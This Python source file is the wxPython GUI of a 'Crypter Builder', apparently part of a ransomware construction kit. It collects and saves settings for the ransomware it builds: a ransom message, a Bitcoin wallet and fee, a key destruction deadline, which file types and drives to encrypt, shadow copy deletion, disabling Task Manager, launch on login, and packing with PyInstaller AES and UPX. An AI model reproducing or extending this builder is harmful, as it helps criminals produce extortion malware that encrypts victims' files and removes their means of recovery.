'''
@summary: Crypter Builder: Provides GUI functionality
@author: MLS
'''

# Import libs
import wx
import datetime
import time
import json
import os
import subprocess
from pubsub import pub

# Import package modules
from .BuilderGuiAbsBase import MainFrame
from .Base import *
from .BuilderThread import BuilderThread

###############
## GUI CLASS ##
###############
class Gui(MainFrame):
    '''
    @summary: Provides a GUI object
    '''
    
    def __init__(self):
        '''
        @summary: Constructor
        @param config_dict: The build configuration, if present
        @param load_config: Handle to a config loader method/object
        '''
        self.language = DEFAULT_LANGUAGE
        self.__builder = None
        self.config_file_path = None
        
        # Init super - MainFrame
        MainFrame.__init__( self, parent=None )
        self.console = Console(self.ConsoleTextCtrl)
        self.StatusBar.SetStatusText("Ready...")
        icon = wx.Icon()
        icon.CopyFromBitmap(wx.Bitmap(os.path.join(self.__get_resources_path(), "builder_logo.bmp"), wx.BITMAP_TYPE_ANY))

        self.SetIcon(icon)
        
        # Update GUI Visuals
        self.update_gui_visuals()
        
        # Set initial event handlers
        self.set_events()


    def __get_resources_path(self):
        '''
        Gets the path to the resources directory
        @return: Resources directory path
        '''

        return os.path.join(os.path.dirname(__file__), "Resources")
        
    
    def update_gui_visuals(self):
        '''
        @summary: Updates the GUI with any aesthetic changes following initialising. This
        inludes updating labels and other widgets
        '''
        
        # Version
        self.TitleLabel.SetLabel(TITLE)
        self.SetTitle(TITLE)
   
        # Set Logo Image
        self.LogoBitmap.SetBitmap(
            wx.Bitmap(
                os.path.join(self.__get_resources_path(), "builder_logo.bmp")
                )
            )
        # Set debug to default level
        self.DebugLevelChoice.SetSelection(
            self.DebugLevelChoice.FindString(
                BUILDER_CONFIG_ITEMS["debug_level"]["default"]
                )
            )
        
    
    def update_config_values(self, config_dict):
        '''
        @summary: Updates the GUI field values with those in the config_dict. Sets to
        empty string if the item is not in the config dict
        @param config_dict: The config dict loaded from the build config file, if any
        '''
        
        # Parse values
        # Builder Language
        self.BuilderLanguageChoice.SetString(0, DEFAULT_LANGUAGE)
        # Debug Level
        if "debug_level" in config_dict:
            self.DebugLevelChoice.SetSelection(
                self.DebugLevelChoice.FindString(config_dict["debug_level"])
                )
        else:
            self.DebugLevelChoice.SetSelection(0)
        # PyInstaller AES Key
        if "pyinstaller_aes_key" in config_dict:
            self.PyInstallerAesKeyTextCtrl.SetValue(config_dict["pyinstaller_aes_key"].upper())
        else:
            self.PyInstallerAesKeyTextCtrl.SetValue("")
        # File Icon
        if "icon_file" in config_dict:
            self.IconFilePicker.SetPath(config_dict["icon_file"])
        else:
            self.IconFilePicker.SetPath("")
        # UPX Packer dir
        if "upx_dir" in config_dict:
            self.UpxDirPicker.SetPath(config_dict["upx_dir"])
        else:
            self.UpxDirPicker.SetPath("")
        # Open GUI On Login
        if "open_gui_on_login" in config_dict:
            self.OpenGuiOnLoginCheckbox.SetValue(config_dict["open_gui_on_login"])
        else:
            self.OpenGuiOnLoginCheckbox.SetValue(BUILDER_CONFIG_ITEMS["open_gui_on_login"]["default"])
        # Time Delay
        if "time_delay" in config_dict:
            self.TimeDelayTextCtrl.SetValue(config_dict["time_delay"])
        else:
            self.TimeDelayTextCtrl.SetValue("")
        # Delete Shadow Copies
        if "delete_shadow_copies" in config_dict:
            self.DeleteShadowCopiesCheckbox.SetValue(config_dict["delete_shadow_copies"])
        else:
            self.DeleteShadowCopiesCheckbox.SetValue(BUILDER_CONFIG_ITEMS["delete_shadow_copies"]["default"])
        # Disable Task Manager
        if "disable_task_manager" in config_dict:
            self.DisableTaskManagerCheckbox.SetValue(config_dict["disable_task_manager"])
        else:
            self.DisableTaskManagerCheckbox.SetValue(BUILDER_CONFIG_ITEMS["disable_task_manager"]["default"])
        # GUI Title
        if "gui_title" in config_dict:
            self.GuiTitleTextCtrl.SetValue(config_dict["gui_title"])
        else:
            self.GuiTitleTextCtrl.SetValue("")
        # Key Destruction time
        if "key_destruction_time" in config_dict:
            self.KeyDestructionTimeTextCtrl.SetValue(config_dict["key_destruction_time"])
        else:
            self.KeyDestructionTimeTextCtrl.SetValue("")
        # Wallet Address
        if "wallet_address" in config_dict:
            self.WalletAddressTextCtrl.SetValue(config_dict["wallet_address"])
        else:
            self.WalletAddressTextCtrl.SetValue("")
        # Bitcoin Fee
        if "bitcoin_fee" in config_dict:
            self.BitcoinFeeTextCtrl.SetValue(config_dict["bitcoin_fee"])
        else:
            self.BitcoinFeeTextCtrl.SetValue("")
        # Encrypt Attached Drives
        if "encrypt_attached_drives" in config_dict:
            self.EncryptAttachedDrivesCheckbox.SetValue(config_dict["encrypt_attached_drives"])
        else:
            self.EncryptAttachedDrivesCheckbox.SetValue(BUILDER_CONFIG_ITEMS["encrypt_attached_drives"]["default"])
        # Encrypt User Home
        if "encrypt_user_home" in config_dict:
            self.EncryptUserHomeCheckbox.SetValue(config_dict["encrypt_user_home"])
        else:
            self.EncryptUserHomeCheckbox.SetValue(BUILDER_CONFIG_ITEMS["encrypt_user_home"]["default"])
        # Max file size to encrypt
        if "max_file_size_to_encrypt" in config_dict:
            self.MaxFileSizeTextCtrl.SetValue(config_dict["max_file_size_to_encrypt"])
        else:
            self.MaxFileSizeTextCtrl.SetValue("")
        # Filetypes to encrypt
        if "filetypes_to_encrypt" in config_dict:
            filetypes = ",".join(config_dict["filetypes_to_encrypt"])
            self.FiletypesToEncryptTextCtrl.SetValue(filetypes)
        else:
            self.FiletypesToEncryptTextCtrl.SetValue("")
        # Encrypted File Extension
        if "encrypted_file_extension" in config_dict:
            self.EncryptedFileExtensionTextCtrl.SetValue(config_dict["encrypted_file_extension"])
        else:
            self.EncryptedFileExtensionTextCtrl.SetValue("")
        # Make GUI Resizeable
        if "make_gui_resizeable" in config_dict:
            self.MakeGuiResizeableCheckbox.SetValue(config_dict["make_gui_resizeable"])
        else:
            self.MakeGuiResizeableCheckbox.SetValue(BUILDER_CONFIG_ITEMS["make_gui_resizeable"]["default"])
        # Always on Top
        if "always_on_top" in config_dict:
            self.AlwaysOnTopCheckbox.SetValue(config_dict["always_on_top"])
        else:
            self.AlwaysOnTopCheckbox.SetValue(BUILDER_CONFIG_ITEMS["always_on_top"]["default"])
        if "background_colour" in config_dict:
            self.BackgroundColourPicker.SetColour(wx.Colour(
                    config_dict["background_colour"][0],
                    config_dict["background_colour"][1],
                    config_dict["background_colour"][2]
                    )
                )
        if "heading_font_colour" in config_dict:
            self.HeadingFontColourPicker.SetColour(wx.Colour(
                    config_dict["heading_font_colour"][0],
                    config_dict["heading_font_colour"][1],
                    config_dict["heading_font_colour"][2]
                    )
                )
        if "primary_font_colour" in config_dict:
            self.PrimaryFontColourPicker.SetColour(wx.Colour(
                    config_dict["primary_font_colour"][0],
                    config_dict["primary_font_colour"][1],
                    config_dict["primary_font_colour"][2]
                    )
                )
        if "secondary_font_colour" in config_dict:
            self.SecondaryFontColourPicker.SetColour(wx.Colour(
                    config_dict["secondary_font_colour"][0],
                    config_dict["secondary_font_colour"][1],
                    config_dict["secondary_font_colour"][2]
                    )
                )
        # Ransom Message
        if "ransom_message" in config_dict:
            self.RansomMessageTextCtrl.SetValue(config_dict["ransom_message"])
        else:
            self.RansomMessageTextCtrl.SetValue("")
            
            
    def __save_config(self, event):
        '''
        @summary: Saves the configuration/user input data to the configuration file
        '''
        # If not saved, used currently loaded config file path
        if self.SaveFilePicker.GetPath():
            self.config_file_path = self.SaveFilePicker.GetPath()

        # Get data from form
        user_input_dict = self.__get_input_data()
        
        # Parse filetypes to encrypt
        # Remove any trailing and leading spaces, dots
        user_input_dict["filetypes_to_encrypt"] = user_input_dict["filetypes_to_encrypt"].split(",")
        for index in range(len(user_input_dict["filetypes_to_encrypt"])):
            user_input_dict["filetypes_to_encrypt"][index] = user_input_dict["filetypes_to_encrypt"][index].strip().strip(".")
            
        # Parse encrypted file extension
        user_input_dict["encrypted_file_extension"] = user_input_dict["encrypted_file_extension"].strip(".")

        # Try to write the config to file
        try:
            with open(self.config_file_path, "w") as config_file_handle:
                json.dump(user_input_dict, config_file_handle, indent=6)
                self.console.log(msg="Build configuration successfully saved to file %s"
                                 % self.config_file_path)
                self.StatusBar.SetStatusText("Config Saved To %s" % self.config_file_path)
                self.__build_config_file = self.config_file_path
                self.__update_loaded_config_file()
        except Exception as ex:
            self.console.log(msg="The configuration could not be saved to %s: %s"
                             % (self.config_file_path, ex),
                             ccode=ERROR_CANNOT_WRITE
                             )
            self.StatusBar.SetStatusText("Error saving configuration file %s" % self.config_file_path)
            self.config_file_path = None

                

    def __load_config(self, event):
        '''
        @summary: Loads builder config from file and updates the form values
        @param self.config_file_path: The path of the config file to load
        '''
        config_dict = {}
        self.config_file_path = self.LoadFilePicker.GetPath()
        self.__reset_label_warnings()


        # Try to load config file and update the GUI
        try:
            with open(self.config_file_path, "r") as config_file_handle:
                config_dict = json.load(config_file_handle)
                self.console.log(msg="Build configuration successfully loaded from %s"
                                 % self.config_file_path)
                self.StatusBar.SetStatusText("Config Loaded From %s" % self.config_file_path)
                self.__build_config_file = self.config_file_path
                self.__update_loaded_config_file()
        except Exception as ex:
            self.console.log(msg="The specified configuration file at %s could not be loaded: %s" 
                             % (self.config_file_path, ex),
                             ccode=ERROR_INVALID_CONFIG_FILE
                             )
            self.StatusBar.SetStatusText("Error loading configuration file %s" % self.config_file_path)
            self.config_file_path = None

        # Update the GUI
        self.update_config_values(config_dict)
        
        return config_dict
    
    
    def __update_loaded_config_file(self):
        '''
        @summary: Updates the value of the "Loaded Config"
        '''
        
        # Truncate path if too long
        if len(self.__build_config_file) >= 30:
            formatted_path = "..." + self.__build_config_file[-27:]
        else:
            formatted_path = self.__build_config_file
            
        self.CurrentConfigFile.SetLabel(formatted_path)
        self.HeaderPanel.Layout()
        
        
    def __open_containing_folder(self, event):
        '''
        @summary: Opens explorer in the "bin" directory where the Crypter binary is written
        '''
        
        subprocess.Popen(r'explorer ".\bin"')

        
    def set_events(self):
        '''
        @summary: Set GUI events for the various controls
        '''
        
        # Catch Language choice changes
        self.Bind(wx.EVT_CHOICE, self.update_language, self.BuilderLanguageChoice)
        
        # Catch config file load and save
        self.Bind(wx.EVT_FILEPICKER_CHANGED, self.__load_config, self.LoadFilePicker)
        self.Bind(wx.EVT_FILEPICKER_CHANGED, self.__save_config, self.SaveFilePicker)

        # BUILD button
        self.Bind(wx.EVT_BUTTON, self.__start_build, self.BuildButton)
        
        # Mainframe close
        self.Bind(wx.EVT_CLOSE, self.__close_builder, self)
        
        # Disable Open Containing Folder Button and bind event
        self.OpenContainingFolderButton.Disable()
        self.Bind(wx.EVT_BUTTON, self.__open_containing_folder, self.OpenContainingFolderButton)
        
    
    def __close_builder(self, event):
        '''
        @summary: Method to catch close events and close the builder gracefully
        '''
        
        # Stop builder and exit
        self.__stop_build(None)
        self.Destroy()
        
        
    def update_language(self, event, language=None):
        '''
        @summary: Updates the Builder GUI language to the selected choice
        @param language: The language to change the form to. This is only provided when
        called directly, and not through a wx Event
        @todo: Finish when support for multiple languages has been enabled for the Builder
        '''
        
        if not event:
            if language == "English":
                self.language = "English"
                #print("Changing language to English")
                

    def __update_progress(self, msg):
        '''
        @summary: Updates the GUI with the build progress and status
        '''
            
        # Log output message to the Console
        self.console.log(debug_level=msg["debug_level"],
                         _class=msg["_class"],
                         msg=msg["msg"],
                         ccode=msg["ccode"],
                         timestamp=msg["timestamp"])

        # CHECK FOR ERRORS
        # If there was a validation error, highlight culprit field label
        if msg["ccode"] == ERROR_INVALID_DATA:
            # Set input field label FG to red
            label_object_name = BUILDER_CONFIG_ITEMS[msg["invalid_input_field"]]["label_object_name"]
            self.__set_label_colour(label_object_name, colour="red")

        # If build is not in progress, Reset BUILD Button and set outcome message
        if (
            (self.__builder and not self.__builder.is_in_progress()) and
            (self.__builder.finished_with_error() or self.__builder.finished_with_success() or self.__builder.finished_with_stop())
            ):
                # Set final output message and destroy the thread
                if self.__builder.finished_with_error():
                    self.console.log(msg="Build finished with error")
                    self.StatusBar.SetStatusText("Build Failed...")
                elif self.__builder.finished_with_success():
                    self.console.log(msg="Build successful")
                    self.console.log(msg="Crypter exe written to '%s'" % self.__builder.get_exe_location())
                    self.StatusBar.SetStatusText("Build Successful...")
                    # Enable "Open Containing Folder" Button
                    self.OpenContainingFolderButton.Enable()
                elif self.__builder.finished_with_stop():
                    self.console.log(msg="Build terminated by user")
                    self.StatusBar.SetStatusText("Build Terminated...")
                self.BuildButton.SetLabel("BUILD")
                self.Bind(wx.EVT_BUTTON, self.__start_build, self.BuildButton)

                # Update gauge to completion
                for percentage in range(0, 150, 50):
                    self.BuildProgressGauge.SetValue(percentage)


    def __set_label_colour(self, label_object_name, colour="red"):
        '''
        @summary: Sets the specified label text colour and refreshes the object
        '''
        
        # Set colour string
        if colour == "red":
            colour_object = "wx.Colour (255,0,0)"
        elif colour == "default":
            colour_object = "wx.SystemSettings.GetColour( wx.SYS_COLOUR_WINDOWTEXT )"
        
        # Change foreground colour
        exec("self.%s.SetForegroundColour( %s )" %
             (label_object_name, colour_object)
            )
        # Refresh object appearance
        exec("self.%s.Hide()" % label_object_name)
        exec("self.%s.Show()" % label_object_name)

        
    def __stop_build(self, event):
        '''
        @summary: Method to terminate the build process
        '''
        
        if self.__builder and self.__builder.is_in_progress():
            self.__builder.stop()
            
            
    def __get_input_data(self):
        '''
        @summary: Retrieves and returns the user's input data from the GUI form
        @return: input data as a dictionary
        '''

        user_input_dict = OrderedDict()
        # Builder Language
        user_input_dict["builder_language"] = self.BuilderLanguageChoice.GetString(
            self.BuilderLanguageChoice.GetSelection()
            )
        # PyInstaller AES Key
        user_input_dict["pyinstaller_aes_key"] = self.PyInstallerAesKeyTextCtrl.GetValue()
        # Icon FIle
        user_input_dict["icon_file"] = self.IconFilePicker.GetPath()
        # Open GUI On Login
        user_input_dict["open_gui_on_login"] = self.OpenGuiOnLoginCheckbox.IsChecked()
        # Time Delay
        user_input_dict["time_delay"] = self.TimeDelayTextCtrl.GetValue()
        # GUI Title
        user_input_dict["gui_title"] = self.GuiTitleTextCtrl.GetValue()
        # UPX Packer Dir
        user_input_dict["upx_dir"] = self.UpxDirPicker.GetPath()
        # Delete Shadow Copies
        user_input_dict["delete_shadow_copies"] = self.DeleteShadowCopiesCheckbox.IsChecked()
        # Disable Task Manager
        user_input_dict["disable_task_manager"] = self.DisableTaskManagerCheckbox.IsChecked()
        # Key Destruction Time
        user_input_dict["key_destruction_time"] = self.KeyDestructionTimeTextCtrl.GetValue()
        # Wallet Address
        user_input_dict["wallet_address"] = self.WalletAddressTextCtrl.GetValue()
        # Bitcoin Fee
        user_input_dict["bitcoin_fee"] = self.BitcoinFeeTextCtrl.GetValue()
        # Encrypt Attached Drives
        user_input_dict["encrypt_attached_drives"] = self.EncryptAttachedDrivesCheckbox.IsChecked()
        # Encrypt User Home
        user_input_dict["encrypt_user_home"] = self.EncryptUserHomeCheckbox.IsChecked()
        # Max file size to encrypt
        user_input_dict["max_file_size_to_encrypt"] = self.MaxFileSizeTextCtrl.GetValue()
        # Filetypes to encrypt
        user_input_dict["filetypes_to_encrypt"] = self.FiletypesToEncryptTextCtrl.GetValue()
        # Encrypted File Extension
        user_input_dict["encrypted_file_extension"] = self.EncryptedFileExtensionTextCtrl.GetValue()
        # GUI Resizeable
        user_input_dict["make_gui_resizeable"] = self.MakeGuiResizeableCheckbox.IsChecked()
        # Always On Top
        user_input_dict["always_on_top"] = self.AlwaysOnTopCheckbox.IsChecked()
        # Background Colour
        user_input_dict["background_colour"] = self.BackgroundColourPicker.GetColour().Get()
        # Heading Font Colour
        user_input_dict["heading_font_colour"] = self.HeadingFontColourPicker.GetColour().Get()
        # Primary Font Colour
        user_input_dict["primary_font_colour"] = self.PrimaryFontColourPicker.GetColour().Get()
        # Secondary Font Colour
        user_input_dict["secondary_font_colour"] = self.SecondaryFontColourPicker.GetColour().Get()
        # Ransom Message
        user_input_dict["ransom_message"] = self.RansomMessageTextCtrl.GetValue()
        # Debug Level
        user_input_dict["debug_level"] = self.DebugLevelChoice.GetString(
            self.DebugLevelChoice.GetSelection()
            )
        
        return user_input_dict
    

    def __reset_label_warnings(self):
        '''
        @summary: Reset any red label warnings back to their default
        '''

        # Reset all labels to standard foreground colour
        for input_field in BUILDER_CONFIG_ITEMS:
            if "label_object_name" in BUILDER_CONFIG_ITEMS[input_field]:
                label_object_name = BUILDER_CONFIG_ITEMS[input_field]["label_object_name"]
                self.__set_label_colour(label_object_name, colour="default")

        
    def __start_build(self, event):
        '''
        @summary: Launches the validate and build processes
        '''
        # Set progress gauge to zero and start progress pulse
        self.BuildProgressGauge.SetValue(0)
        self.BuildProgressGauge.Pulse()
        self.StatusBar.SetStatusText("Running Build...")
        self.__reset_label_warnings()
        
        user_input_dict = self.__get_input_data()
        
            
        # Clear the Console and setup debug
        self.console.clear()
        self.OpenContainingFolderButton.Disable()
        self.Bind(wx.EVT_BUTTON, self.__stop_build, self.BuildButton)
        self.BuildButton.SetLabel("STOP")
        self.console.log(msg="Build Launched")
        self.console.log(msg="DEBUG Level: %s" % user_input_dict["debug_level"])
        self.console.set_debug_level(user_input_dict["debug_level"])
        
        
        # Create listeners and Launch the Build thread
        pub.subscribe(self.__update_progress, "update")
        self.__builder = BuilderThread(user_input_dict)
        
        
        
###################
## CONSOLE CLASS ##
###################
class Console():
    '''
    @summary: Provides an interface for the GUI Console window
    '''
    
    def __init__(self, console):
        '''
        @summary: Constructor
        @param console: Handle to the wxPython console TextCtrl
        '''
        self.__console_box = console
        self.__debug_level = "0 - Minimal"


    def log(self, debug_level=0, _class=None, msg=None, ccode=0, timestamp=True):
        '''
        @summary: Logs output to the Console
        @param debug_level: The debug level of the message
        @param _class: The class that is performing the log
        @param msg: The message to log to the Console Text screen
        '''
        to_log = ""
        
        # Add timestamp
        if timestamp:
            to_log += "[%s]: " % self.__get_timestamp()
        
        # Add status message
        if ccode:
            to_log += "(ERROR): "
        
        # Add class
        if _class:
            to_log += "%s: " % _class
        
        # Add message
        to_log += "%s" % msg
        
        # Add the message to the Console box
        if msg and debug_level <= int(self.__debug_level[0]):
            self.__console_box.AppendText(to_log + "\n")
        

    def clear(self):
        '''
        @summary: Clears the Console output screen
        '''
        
        self.__console_box.Clear()
        

    def __get_timestamp(self):
        '''
        @summary: Return timestamp string
        '''
        
        current_time = datetime.datetime.now()
        time_output = "%s-%s-%s %s:%s:%s" % (
            current_time.year,
            current_time.month if current_time.month >= 10 else "0%s" % current_time.month,
            current_time.day if current_time.day >= 10 else "0%s" % current_time.day,
            current_time.hour if current_time.hour >= 10 else "0%s" % current_time.hour,
            current_time.minute if current_time.minute >= 10 else "0%s" % current_time.minute,
            current_time.second if current_time.second >= 10 else "0%s" % current_time.second
            )
                
        return time_output


    def set_debug_level(self, level):
        '''
        @summary: Sets the console logging debug level. Messages below the debug level
        will be ignored, and won't be logged to the console.
        @param level: The debug level to set to console to. Should be one of the following:
            "0 - Minimal"
            "1 - Low"
            "2 - Medium"
            "3 - High"
        '''
        
        self.__debug_level = level

        
    
    
    
    
    
    
